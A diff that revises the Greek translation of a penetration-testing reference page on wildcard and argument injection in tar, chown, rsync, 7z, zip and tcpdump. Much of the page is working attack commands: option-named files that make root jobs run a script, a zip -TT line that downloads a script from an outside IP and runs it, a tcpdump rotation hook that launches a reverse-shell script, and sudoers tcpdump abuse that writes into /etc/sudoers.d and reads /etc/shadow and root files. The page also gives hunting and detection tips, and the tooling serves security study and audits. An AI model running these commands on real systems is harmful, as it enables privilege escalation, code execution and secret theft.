@@ -1,27 +1,29 @@
-# Wildcards Spare Tricks
+# Κόλπα με Wildcards
 
-> Το **argument injection** μέσω wildcard (γνωστό και ως *glob*) συμβαίνει όταν ένα privileged script εκτελεί ένα Unix binary όπως τα `tar`, `chown`, `rsync`, `zip`, `7z`, … με ένα wildcard χωρίς εισαγωγικά, όπως το `*`.
-> Καθώς το shell κάνει expand το wildcard **πριν** εκτελέσει το binary, ένας attacker που μπορεί να δημιουργήσει αρχεία στον working directory μπορεί να δημιουργήσει filenames που αρχίζουν με `-`, ώστε να ερμηνευτούν ως **options αντί για data**, μεταφέροντας ουσιαστικά αυθαίρετα flags ή ακόμη και commands.<sup>[[6]](#references)</sup>
-> Αυτή η σελίδα συγκεντρώνει τα πιο χρήσιμα primitives, την πρόσφατη έρευνα και τις σύγχρονες detections για την περίοδο 2023-2025.
+{{#include ../../banners/hacktricks-training.md}}
+
+> Το **argument injection** μέσω Wildcard (γνωστό και ως *glob*) συμβαίνει όταν ένα privileged script εκτελεί ένα Unix binary όπως `tar`, `chown`, `rsync`, `zip`, `7z`, … με ένα wildcard χωρίς εισαγωγικά, όπως το `*`.
+> Επειδή το shell επεκτείνει το wildcard **πριν** εκτελέσει το binary, ένας attacker που μπορεί να δημιουργήσει αρχεία στον working directory μπορεί να κατασκευάσει filenames που ξεκινούν με `-`, ώστε να ερμηνευτούν ως **options αντί για data**, μεταφέροντας αποτελεσματικά αυθαίρετα flags ή ακόμη και commands.<sup>[[6]](#references)</sup>
+> Αυτή η σελίδα συγκεντρώνει τα πιο χρήσιμα primitives, πρόσφατη έρευνα και σύγχρονες detections για το 2023-2025.
 
 ## chown / chmod
 
-Μπορείτε να **αντιγράψετε τον owner/group ή τα permission bits από ένα reference file** καταχρώμενοι το flag `--reference`, όταν ένα filename που μοιάζει με option γίνεται expand από ένα wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
+Μπορείτε να **αντιγράψετε τον owner/group ή τα permission bits από ένα reference file** καταχρώμενοι το flag `--reference`, όταν ένα filename που μοιάζει με option επεκτείνεται από ένα wildcard.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 # attacker-controlled directory
 touch -- .drf.php
 chmod 777 -- .drf.php
 touch -- "--reference=.drf.php"   # ← filename becomes an argument
 ```
-Όταν αργότερα ο root εκτελέσει κάτι όπως:
+Όταν το root εκτελέσει αργότερα κάτι όπως:
 ```bash
 chown -R alice:alice *.php
 chmod -R 644 *.php
 ```
-Το expanded `--reference=.drf.php` παρακάμπτει τον explicit owner/mode, με αποτέλεσμα τα matching files να κληρονομούν τα metadata από το `.drf.php` (και, με το παραπάνω setup, να γίνονται writable από τον attacker).<sup>[[6]](#references)</sup>
+Το expanded `--reference=.drf.php` παρακάμπτει τα explicit owner/mode, με αποτέλεσμα τα matching files να κληρονομούν τα metadata από το `.drf.php` (και, με το παραπάνω setup, να γίνονται writable από τον attacker).<sup>[[6]](#references)</sup>
 
-*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).<sup>[[7]](#references)</sup>  
-Δείτε επίσης το κλασικό paper της DefenseCode για λεπτομέρειες.<sup>[[6]](#references)</sup>
+*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).<sup>[[7]](#references)</sup>
+Δείτε επίσης το classic DefenseCode paper για λεπτομέρειες.<sup>[[6]](#references)</sup>
 
 ---
 
@@ -29,7 +31,7 @@ chmod -R 644 *.php
 
 ### GNU tar
 
-Εκτέλεση arbitrary commands μέσω κατάχρησης του **checkpoint** feature και των checkpoint actions του GNU tar.<sup>[[10]](#references)</sup>
+Εκτελέστε arbitrary commands κάνοντας abuse του **checkpoint** feature και των checkpoint actions του GNU tar.<sup>[[10]](#references)</sup>
 ```bash
 # attacker-controlled directory
 echo 'echo pwned > /tmp/pwn' > shell.sh
@@ -37,16 +39,16 @@ chmod +x shell.sh
 touch -- "--checkpoint=1"
 touch -- "--checkpoint-action=exec=sh shell.sh"
 ```
-Μόλις ο root εκτελέσει π.χ. `tar -czf /root/backup.tgz *`, το `shell.sh` εκτελείται ως root.<sup>[[10]](#references)</sup>
+Μόλις ο root εκτελέσει, για παράδειγμα, `tar -czf /root/backup.tgz *`, το `shell.sh` εκτελείται ως root.<sup>[[10]](#references)</sup>
 
-### bsdtar / παράκαμψη compressor στο macOS
+### Σημείωση σχετικά με την παράκαμψη του compressor στο bsdtar / macOS
 
-Το προεπιλεγμένο `tar` σε πρόσφατες εκδόσεις του macOS (με βάση το `libarchive`) δεν παρέχει το interface `--checkpoint` του GNU tar, αλλά το bsdtar τεκμηριώνει το **--use-compress-program** για την επιλογή ενός εξωτερικού compressor.<sup>[[11]](#references)</sup>
+Το προεπιλεγμένο `tar` στις πρόσφατες εκδόσεις του macOS (με βάση το `libarchive`) δεν παρέχει το interface `--checkpoint` του GNU tar, αλλά το bsdtar τεκμηριώνει το **--use-compress-program** για την επιλογή ενός external compressor.<sup>[[11]](#references)</sup>
 ```bash
 # macOS example
 touch -- "--use-compress-program=sh"
 ```
-Όταν ένα privileged script εκτελεί `tar -cf backup.tar *`, αυτό επιλέγει το `sh` μέσω του `PATH` του victim και το bsdtar το εκκινεί ως compressor.<sup>[[11]](#references)</sup> Αυτό αποδεικνύει option injection, αλλά από μόνο του δεν αποτελεί αξιόπιστο arbitrary-command primitive: ένα filename που δημιουργείται από wildcard δεν μπορεί να περιέχει `/`, και το bsdtar παρέχει archive data αντί για shell command που έχει επιλεγεί από τον attacker. Η εκτέλεση κώδικα απαιτεί επιπλέον ένα controllable executable που επιλύεται μέσω του `PATH` ή μέσω άλλου argument channel που μπορεί να ορίσει ένα χρήσιμο πρόγραμμα.
+Όταν ένα privileged script εκτελεί `tar -cf backup.tar *`, αυτό επιλέγει το `sh` μέσω του `PATH` του victim και το bsdtar το εκκινεί ως compressor.<sup>[[11]](#references)</sup> Αυτό αποδεικνύει option injection, αλλά από μόνο του δεν αποτελεί αξιόπιστο arbitrary-command primitive: ένα filename που δημιουργείται μέσω wildcard δεν μπορεί να περιέχει `/`, και το bsdtar παρέχει archive data αντί για shell command που έχει επιλέξει ο attacker. Για την εκτέλεση κώδικα απαιτείται επιπλέον ένα controllable executable που επιλύεται μέσω `PATH` ή ένα άλλο argument channel που μπορεί να ορίσει ένα χρήσιμο πρόγραμμα.
 
 ---
 
@@ -57,7 +59,7 @@ touch -- "--use-compress-program=sh"
 # attacker-controlled directory
 touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
 ```
-Αν το root αργότερα αρχειοθετήσει τον κατάλογο με `rsync -az * backup:/srv/`, το injected flag μπορεί να εκτελέσει ένα shell μέσω του remote-shell mechanism.<sup>[[7]](#references)[[12]](#references)</sup>
+Αν το root αρχειοθετήσει αργότερα τον κατάλογο με `rsync -az * backup:/srv/`, το injected flag μπορεί να εκτελέσει ένα shell μέσω του remote-shell mechanism.<sup>[[7]](#references)[[12]](#references)</sup>
 
 *PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).
 
@@ -65,7 +67,7 @@ touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
 
 ## 7-Zip / 7z / 7za
 
-Ακόμη και όταν το privileged script προσθέτει *defensively* το `--` πριν από το wildcard (για να σταματήσει το option parsing), το 7-Zip CLI δέχεται **file list files** προσθέτοντας το πρόθεμα `@` στο filename. Ο συνδυασμός αυτού με ένα symlink σάς επιτρέπει να κάνετε *exfiltrate arbitrary files*.<sup>[[13]](#references)</sup>
+Ακόμη και όταν το privileged script προσθέτει *defensively* το `--` πριν από το wildcard (για να σταματήσει το option parsing), το 7-Zip CLI αποδέχεται **file list files** αν το filename έχει ως πρόθεμα το `@`. Ο συνδυασμός αυτού με ένα symlink σάς επιτρέπει να κάνετε *exfiltrate arbitrary files*.<sup>[[13]](#references)</sup>
 ```bash
 # directory writable by low-priv user
 cd /path/controlled
@@ -76,17 +78,17 @@ touch @root.txt                  # tells 7z to use root.txt as file list
 ```bash
 7za a /backup/`date +%F`.7z -t7z -snl -- *
 ```
-Το 7-Zip θα προσπαθήσει να διαβάσει το `root.txt` (→ `/etc/shadow`) ως file list και θα τερματίσει, **εκτυπώνοντας τα περιεχόμενα στο stderr**.<sup>[[13]](#references)</sup>
+Το 7-Zip θα προσπαθήσει να διαβάσει το `root.txt` (→ `/etc/shadow`) ως λίστα αρχείων και θα τερματίσει, **εκτυπώνοντας τα περιεχόμενα στο stderr**.<sup>[[13]](#references)</sup>
 
-Αυτό λειτουργεί παρά το `-- *`, επειδή το 7-Zip CLI αποδέχεται ρητά τόσο κανονικά filenames όσο και `@listfiles` ως positional inputs, επομένως ένα literal filename όπως το `@root.txt` εξακολουθεί να αντιμετωπίζεται ειδικά.<sup>[[13]](#references)</sup>
+Αυτό λειτουργεί με το `-- *`, επειδή το CLI του 7-Zip αποδέχεται ρητά τόσο κανονικά ονόματα αρχείων όσο και `@listfiles` ως positional inputs, επομένως ένα literal όνομα αρχείου όπως το `@root.txt` εξακολουθεί να αντιμετωπίζεται ειδικά.<sup>[[13]](#references)</sup>
 
 ---
 
 ## zip
 
-Υπάρχουν δύο πολύ πρακτικά primitives όταν μια εφαρμογή περνά filenames που ελέγχει ο χρήστης στο `zip` (είτε μέσω wildcard είτε απαριθμώντας ονόματα χωρίς `--`).<sup>[[2]](#references)[[3]](#references)</sup>
+Υπάρχουν δύο πολύ πρακτικά primitives όταν μια εφαρμογή περνά filenames που ελέγχονται από τον χρήστη στο `zip` (είτε μέσω wildcard είτε απαριθμώντας ονόματα χωρίς `--`).<sup>[[2]](#references)[[3]](#references)</sup>
 
-- RCE μέσω test hook: Το `-T` ενεργοποιεί το “test archive” και το `-TT <cmd>` αντικαθιστά τον tester με ένα arbitrary πρόγραμμα (long form: `--unzip-command <cmd>`). Αν μπορείτε να κάνετε inject filenames που ξεκινούν με `-`, διαχωρίστε τα flags σε distinct filenames ώστε να λειτουργεί το short-options parsing.<sup>[[2]](#references)[[3]](#references)</sup>
+- RCE via test hook: Το `-T` ενεργοποιεί το “test archive” και το `-TT <cmd>` αντικαθιστά το tester με ένα arbitrary πρόγραμμα (long form: `--unzip-command <cmd>`). Αν μπορείτε να εισαγάγετε filenames που ξεκινούν με `-`, διαχωρίστε τα flags σε distinct filenames ώστε να λειτουργεί το short-options parsing.<sup>[[2]](#references)[[3]](#references)</sup>
 ```bash
 # Attacker-controlled filenames (e.g., in an upload directory)
 # 1) A file literally named: -T
@@ -96,42 +98,42 @@ touch @root.txt                  # tells 7z to use root.txt as file list
 # zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
 ```
 Σημειώσεις
-- ΜΗΝ δοκιμάσετε ένα μόνο filename όπως `'-T -TT <cmd>'` — οι short options αναλύονται ανά χαρακτήρα και θα αποτύχει. Χρησιμοποιήστε ξεχωριστά tokens όπως φαίνεται.<sup>[[3]](#references)</sup>
-- Αν τα slashes αφαιρούνται από τα filenames από την εφαρμογή, κάντε fetch από ένα bare host/IP (προεπιλεγμένη διαδρομή `/index.html`) και αποθηκεύστε τοπικά με `-O`, έπειτα εκτελέστε το.<sup>[[3]](#references)</sup>
-- Μπορείτε να κάνετε debug στο parsing με `-sc` (εμφάνιση του processed argv) ή `-h2` (περισσότερη βοήθεια), ώστε να κατανοήσετε πώς καταναλώνονται τα tokens σας.<sup>[[3]](#references)</sup>
+- ΜΗΝ δοκιμάσετε ένα μόνο filename όπως `'-T -TT <cmd>'` — τα short options αναλύονται ανά χαρακτήρα και θα αποτύχει. Χρησιμοποιήστε ξεχωριστά tokens όπως φαίνεται.<sup>[[3]](#references)</sup>
+- Αν τα slashes αφαιρούνται από τα filenames από την εφαρμογή, κάντε fetch από ένα bare host/IP (προεπιλεγμένο path `/index.html`) και αποθηκεύστε τοπικά με `-O`, έπειτα εκτελέστε το.<sup>[[3]](#references)</sup>
+- Μπορείτε να κάνετε debug το parsing με `-sc` (εμφάνιση του processed argv) ή `-h2` (περισσότερη βοήθεια), ώστε να κατανοήσετε πώς καταναλώνονται τα tokens σας.<sup>[[3]](#references)</sup>
 
 Παράδειγμα (τοπική συμπεριφορά στο zip 3.0).<sup>[[3]](#references)</sup>
 ```bash
 zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
 zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
 ```
-- Data exfil/leak: Αν το web layer επιστρέφει το stdout/stderr του `zip` (συνηθισμένο σε naive wrappers), injected flags όπως `--help` ή failures από bad options θα εμφανιστούν στην HTTP response, επιβεβαιώνοντας command-line injection και βοηθώντας στη βελτιστοποίηση των payloads.<sup>[[3]](#references)</sup>
+- Data exfil/leak: Αν το web layer επιστρέφει το stdout/stderr του `zip` (συνηθισμένο σε naive wrappers), injected flags όπως τα `--help` ή failures από λανθασμένες options θα εμφανιστούν στην HTTP response, επιβεβαιώνοντας το command-line injection και βοηθώντας στη βελτιστοποίηση των payloads.<sup>[[3]](#references)</sup>
 
 ---
 
 ## Πρόσθετοι υποψήφιοι για option-injection
 
-Όταν ένα privileged wrapper επεκτείνει έναν writable directory με wildcard, αξίζει να ελεγχθούν τα παρακάτω documented option hooks.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
+Όταν ένας privileged wrapper επεκτείνει έναν writable directory με wildcard, αξίζει να ελεγχθούν αυτά τα documented option hooks.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
 
 | Binary | Flag to abuse | Effect |
 | --- | --- | --- |
 | `flock` | `-c <cmd>` | Περνά ένα command string σε shell |
-| `git`   | `-c core.sshCommand=<cmd>` | Χρησιμοποιεί το `<cmd>` αντί για SSH για Git fetch/push |
+| `git`   | `-c core.sshCommand=<cmd>` | Χρησιμοποιεί το `<cmd>` αντί για SSH σε Git fetch/push |
 | `scp`   | `-S <program>` | Χρησιμοποιεί ένα alternate SSH-compatible connection program |
 
-Αυτά τα primitives είναι χρήσιμοι έλεγχοι πέρα από τα κλασικά *tar/rsync/zip*.
+Αυτά τα primitives είναι χρήσιμα checks πέρα από τα κλασικά *tar/rsync/zip*.
 
 ---
 
 ## Αναζήτηση vulnerable wrappers και jobs
 
-Πρόσφατα case studies και guidance για detection δείχνουν ότι το wildcard/argv injection δεν αποτελεί πλέον μόνο πρόβλημα **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Η ίδια κατηγορία bug συνεχίζει να εμφανίζεται σε:
+Πρόσφατα case studies και detection guidance δείχνουν ότι το wildcard/argv injection δεν αποτελεί πλέον απλώς πρόβλημα **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Η ίδια κατηγορία bug συνεχίζει να εμφανίζεται σε:
 
 - web features που κάνουν "download everything as zip/tar" από attacker-controlled upload directories
-- vendor/appliance debug shells που εκθέτουν ένα **tcpdump** wrapper με attacker-controlled filename/filter fields
-- backup ή rotation jobs που εκτελούν `tar`, `rsync`, `7z`, `zip`, `chown` ή `chmod` σε writable directories
+- vendor/appliance debug shells που εκθέτουν έναν **tcpdump** wrapper με attacker-controlled filename/filter fields
+- backup ή rotation jobs που καλούν `tar`, `rsync`, `7z`, `zip`, `chown` ή `chmod` σε writable directories
 
-Χρήσιμες triage commands (η invocation του `pspy` χρησιμοποιεί τα documented process/file-event και interval flags).<sup>[[14]](#references)</sup>
+Χρήσιμες εντολές triage (η invocation του `pspy` χρησιμοποιεί τα documented process/file-event και interval flags).<sup>[[14]](#references)</sup>
 ```bash
 # Hunt for interesting binaries fed with globs or positional user data
 rg -n --hidden --follow \
@@ -145,22 +147,22 @@ pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'
 sudo -l
 rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
 ```
-Γρήγοροι ευρετικοί κανόνες:
+Γρήγορες ευρετικές:
 
-- Το `-- *` είναι μια καλή λύση για πολλά GNU tools, αλλά **όχι** για τα `7z`/`7za`, επειδή τα `@listfiles` αναλύονται ξεχωριστά.<sup>[[13]](#references)</sup>
-- Για το `zip`, αναζητήστε wrappers που απαριθμούν απευθείας filenames ελεγχόμενα από τον χρήστη· το short-option splitting (`-T` + `-TT <cmd>`) εξακολουθεί να λειτουργεί ακόμη και χωρίς shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
-- Για το `tcpdump`, δώστε ιδιαίτερη προσοχή σε wrappers που σας επιτρέπουν να ελέγχετε **output file names**, **rotation settings** ή ορίσματα **capture-file replay**.<sup>[[18]](#references)</sup>
+- Το `-- *` αποτελεί καλή διόρθωση για πολλά GNU tools, αλλά **όχι** για τα `7z`/`7za`, επειδή τα `@listfiles` αναλύονται ξεχωριστά.<sup>[[13]](#references)</sup>
+- Για το `zip`, αναζητήστε wrappers που απαριθμούν απευθείας filenames τα οποία ελέγχει ο χρήστης· το short-option splitting (`-T` + `-TT <cmd>`) εξακολουθεί να λειτουργεί ακόμη και χωρίς shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
+- Για το `tcpdump`, δώστε ιδιαίτερη προσοχή σε wrappers που σας επιτρέπουν να ελέγχετε **output file names**, **rotation settings** ή arguments για **capture-file replay**.<sup>[[18]](#references)</sup>
 
 ---
 
 ## tcpdump rotation hooks (-G/-W/-z): RCE μέσω argv injection σε wrappers
 
-Όταν ένα restricted shell ή vendor wrapper δημιουργεί μια γραμμή εντολών `tcpdump` με συνένωση πεδίων ελεγχόμενων από τον χρήστη (π.χ. μια παράμετρο "file name") χωρίς αυστηρό quoting/validation, μπορείτε να εισαγάγετε κρυφά επιπλέον flags του `tcpdump`. Ο συνδυασμός των `-G` (time-based rotation), `-W` (περιορισμός του αριθμού των files) και `-z <cmd>` (post-rotate command) επιτρέπει arbitrary command execution ως ο χρήστης που εκτελεί το tcpdump (συχνά root σε appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>
+Όταν ένα restricted shell ή vendor wrapper δημιουργεί μια command line για το `tcpdump` συνενώνοντας fields που ελέγχει ο χρήστης (π.χ. μια παράμετρο "file name") χωρίς αυστηρό quoting/validation, μπορείτε να εισαγάγετε κρυφά επιπλέον flags του `tcpdump`. Ο συνδυασμός των `-G` (time-based rotation), `-W` (περιορισμός του αριθμού των files) και `-z <cmd>` (post-rotate command) επιτρέπει arbitrary command execution ως ο χρήστης που εκτελεί το tcpdump (συχνά ως root σε appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>
 
-Προϋποθέσεις:
+Προαπαιτούμενα:
 
 - Μπορείτε να επηρεάσετε το `argv` που περνά στο `tcpdump` (π.χ. μέσω ενός wrapper όπως `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
-- Το wrapper δεν απολυμαίνει spaces ή tokens με πρόθεμα `-` στο πεδίο του file name.<sup>[[4]](#references)</sup>
+- Το wrapper δεν απολυμαίνει spaces ή tokens που ξεκινούν με `-` στο πεδίο του file name.<sup>[[4]](#references)</sup>
 
 Κλασικό PoC (εκτελεί ένα reverse shell script από writable path).<sup>[[4]](#references)[[18]](#references)</sup>
 ```sh
@@ -183,23 +185,23 @@ printf x | nc -u -6 [victim_ipv6] 1234
 Λεπτομέρειες:
 
 - Το `-G 1` κάνει rotation κάθε δευτερόλεπτο και το `-W 1` σταματά μετά από ένα rotated file· το capture πρέπει να λάβει ένα matching packet πριν από το rotation.<sup>[[18]](#references)</sup>
-- Το `-z <cmd>` εκτελεί την post-rotate εντολή μία φορά ανά rotation και περνά τη διαδρομή του closed savefile ως όρισμα· βεβαιωθείτε ότι ο χειρισμός των ορισμάτων από το script/interpreter αντιστοιχεί στο payload σας.<sup>[[18]](#references)</sup>
+- Το `-z <cmd>` εκτελεί την post-rotate command μία φορά ανά rotation και περνά τη διαδρομή του κλειστού savefile ως όρισμα· βεβαιωθείτε ότι ο χειρισμός των ορισμάτων από το script/interpreter ταιριάζει με το payload σας.<sup>[[18]](#references)</sup>
 
 Παραλλαγές χωρίς removable media:
 
-- Αν έχετε οποιοδήποτε άλλο primitive για εγγραφή αρχείων (π.χ. ένα ξεχωριστό command wrapper που επιτρέπει output redirection), τοποθετήστε το script σας σε γνωστή διαδρομή και ενεργοποιήστε το `-z /path/script.sh`· αφήστε το script να καλέσει το `/bin/sh` από μόνο του, αν χρειάζεται.<sup>[[18]](#references)</sup>
-- Αν ένα vendor wrapper σάς επιτρέπει να επιλέξετε το rotated path, ελέγξτε αυτόν τον έλεγχο διαδρομής μόνο σε συνδυασμό με μια post-rotate εντολή που ερμηνεύει το savefile argument· ο έλεγχος διαδρομής από μόνος του δεν εκτελεί τα περιεχόμενα του αρχείου.<sup>[[18]](#references)</sup>
+- Αν έχετε οποιοδήποτε άλλο primitive για εγγραφή αρχείων (π.χ. ένα ξεχωριστό command wrapper που επιτρέπει output redirection), τοποθετήστε το script σας σε γνωστή διαδρομή και ενεργοποιήστε το `-z /path/script.sh`· το script πρέπει να εκτελεί μόνο του το `/bin/sh`, αν χρειάζεται.<sup>[[18]](#references)</sup>
+- Αν ένα vendor wrapper σάς επιτρέπει να επιλέξετε το rotated path, ελέγξτε το path control μόνο σε συνδυασμό με post-rotate command που ερμηνεύει το savefile argument· το path control από μόνο του δεν εκτελεί τα περιεχόμενα του αρχείου.<sup>[[18]](#references)</sup>
 
 ---
 
-## sudoers: tcpdump με wildcards/additional args → αυθαίρετη εγγραφή/ανάγνωση και root
+## sudoers: tcpdump με wildcards/επιπλέον args → arbitrary write/read και root
 
 Παράδειγμα anti-pattern στο sudoers:<sup>[[3]](#references)</sup>
 ```text
 (ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
 ```
-Ο κανόνας αφήνει διαθέσιμες αρκετές επιλογές μέσω του τεκμηριωμένου parser του `tcpdump`:<sup>[[3]](#references)[[18]](#references)</sup>
-- Το glob `*` και τα permissive patterns περιορίζουν μόνο το πρώτο όρισμα `-w`. Το `tcpdump` δέχεται πολλές επιλογές `-w`; υπερισχύει η τελευταία.<sup>[[3]](#references)[[18]](#references)</sup>
+Ο κανόνας αφήνει διαθέσιμες αρκετές επιλογές μέσω του documented parser του `tcpdump`:<sup>[[3]](#references)[[18]](#references)</sup>
+- Το glob `*` και τα permissive patterns περιορίζουν μόνο το πρώτο όρισμα `-w`. Το `tcpdump` δέχεται πολλαπλές επιλογές `-w`· ισχύει η τελευταία.<sup>[[3]](#references)[[18]](#references)</sup>
 - Ο κανόνας δεν περιορίζει άλλες επιλογές, επομένως επιτρέπονται τα `-Z`, `-r`, `-V` κ.λπ.<sup>[[3]](#references)[[18]](#references)</sup>
 
 Τα σχετικά primitives τεκμηριώνονται παρακάτω.<sup>[[3]](#references)[[18]](#references)</sup>
@@ -209,19 +211,19 @@ sudo tcpdump -c10 -w/var/cache/captures/a/ \
 -w /dev/shm/out.pcap \
 -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-- Path traversal μέσα στο πρώτο `-w` για έξοδο από το περιορισμένο δέντρο.<sup>[[3]](#references)</sup>
+- Path traversal μέσα στο πρώτο `-w` για διαφυγή από το περιορισμένο tree.<sup>[[3]](#references)</sup>
 ```bash
 sudo tcpdump -c10 \
 -w/var/cache/captures/a/../../../../dev/shm/out \
 -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-- Επιβολή ιδιοκτησίας των αρχείων εξόδου με `-Z root` (δημιουργεί αρχεία με ιδιοκτήτη root οπουδήποτε).<sup>[[3]](#references)[[18]](#references)</sup>
+- Επιβάλετε την ιδιοκτησία των αρχείων εξόδου με `-Z root` (δημιουργεί αρχεία με ιδιοκτήτη root οπουδήποτε).<sup>[[3]](#references)[[18]](#references)</sup>
 ```bash
 sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
 -w /dev/shm/root-owned \
 -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-- Εγγραφή αυθαίρετου περιεχομένου με επανάληψη ενός crafted PCAP μέσω του `-r` (π.χ. για την προσθήκη μιας γραμμής sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
+- Εγγραφή αυθαίρετου περιεχομένου με αναπαραγωγή ενός crafted PCAP μέσω του `-r` (π.χ. για την προσθήκη μιας γραμμής sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
 
 <details>
 <summary>Δημιουργήστε ένα PCAP που περιέχει το ακριβές ASCII payload και γράψτε το ως root</summary>
@@ -236,7 +238,9 @@ sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
 -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
 -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-- Ανάγνωση αυθαίρετων αρχείων/secret leak με το `-V <file>` (ερμηνεύει μια λίστα από savefiles). Τα διαγνωστικά σφαλμάτων συχνά κάνουν echo γραμμών, προκαλώντας content leak.<sup>[[3]](#references)[[18]](#references)</sup>
+</details>
+
+- Ανάγνωση αυθαίρετων αρχείων/secret leak με `-V <file>` (ερμηνεύει μια λίστα από savefiles). Τα διαγνωστικά σφαλμάτων συχνά κάνουν echo τις γραμμές, προκαλώντας leak περιεχομένου.<sup>[[3]](#references)[[18]](#references)</sup>
 ```bash
 sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
 -w /tmp/dummy \
@@ -248,20 +252,20 @@ sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
 
 - [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
 - [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
-- [3] [0xdf - HTB Dump: Έγχυση ορίσματος zip σε RCE + privesc μέσω εσφαλμένης ρύθμισης sudo του tcpdump](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
-- [4] [FiberGateway GR241AG - Πλήρης αλυσίδα exploit](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
-- [5] [Elastic - Εντοπίστηκε πιθανό Shell μέσω έγχυσης Wildcard](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
-- [6] [Πίσω στο μέλλον: Τα Unix Wildcards εκτός ελέγχου (DefenseCode)](https://www.exploit-db.com/papers/33930)
+- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
+- [4] [FiberGateway GR241AG - Πλήρης Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
+- [5] [Elastic - Εντοπίστηκε πιθανό Shell μέσω Wildcard Injection](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
+- [6] [Back To The Future: Τα Unix Wildcards εκτός ελέγχου (DefenseCode)](https://www.exploit-db.com/papers/33930)
 - [7] [wildpwn](https://github.com/localh0t/wildpwn)
-- [8] [Επίκληση του GNU Coreutils `chown`](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
-- [9] [Επίκληση του GNU Coreutils `chmod`](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
-- [10] [Checkpoints του GNU tar](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
+- [8] [GNU Coreutils `chown` κλήση](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
+- [9] [GNU Coreutils `chmod` κλήση](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
+- [10] [GNU tar checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
 - [11] [Εγχειρίδιο bsdtar(1)](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
 - [12] [Εγχειρίδιο rsync(1)](https://download.samba.org/pub/rsync/rsync.1)
-- [13] [Σύνταξη γραμμής εντολών του 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
+- [13] [Σύνταξη γραμμής εντολών 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
 - [14] [pspy](https://github.com/DominicBreuker/pspy)
 - [15] [Εγχειρίδιο flock(1)](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
-- [16] [Τεκμηρίωση ρυθμίσεων του Git](https://git-scm.com/docs/git-config)
-- [17] [Εγχειρίδιο του OpenBSD `scp`](https://man.openbsd.org/scp)
+- [16] [Τεκμηρίωση ρυθμίσεων Git](https://git-scm.com/docs/git-config)
+- [17] [Εγχειρίδιο OpenBSD `scp`](https://man.openbsd.org/scp)
 - [18] [Εγχειρίδιο tcpdump(8)](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
 {{#include ../../banners/hacktricks-training.md}}
